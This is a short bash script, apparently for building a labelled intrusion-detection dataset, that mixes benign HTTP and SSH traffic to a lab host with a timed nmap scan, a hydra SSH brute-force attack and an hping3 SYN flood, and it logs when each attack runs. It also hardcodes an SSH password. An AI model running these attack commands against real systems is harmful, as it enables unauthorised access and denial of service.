#!/bin/bash
# usage: ./run_round.sh 1
R=$1; T=10.10.10.2; LOG=~/round${R}_attack_log.csv
echo "label,start_ms,end_ms" > $LOG
ms(){ date +%s%3N; }
normal(){
  end=$(( $(date +%s) + $1 ))
  while [ $(date +%s) -lt $end ]; do
    case $((RANDOM % 3)) in
      0) curl -s -o /dev/null http://$T/ ;;
      1) curl -s -o /dev/null http://$T/page$RANDOM.html ;;
      2) sshpass -p 'Summer2024' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 victim@$T 'ls -la; uptime' >/dev/null 2>&1 ;;
    esac
    sleep $(( RANDOM % 3 + 1 ))
  done
}
attack(){
  label=$1; shift
  sudo -v
  echo "[$(date +%T)] START $label"
  s=$(ms); "$@" >/dev/null 2>&1; e=$(ms)
  echo "$label,$s,$e" >> $LOG
  echo "[$(date +%T)] END $label"
}
echo "[$(date +%T)] normal traffic (3 min)"; normal 180
sleep 20; attack scan nmap -p 1-1000 $T
sleep 20; attack bruteforce hydra -l victim -P $HOME/pw.txt -t 4 -f ssh://$T
sleep 20; attack synflood sudo timeout 20 hping3 -S -p 80 -i u10000 $T
sleep 20; echo "[$(date +%T)] normal traffic (2 min)"; normal 120
echo "ROUND $R FINISHED"
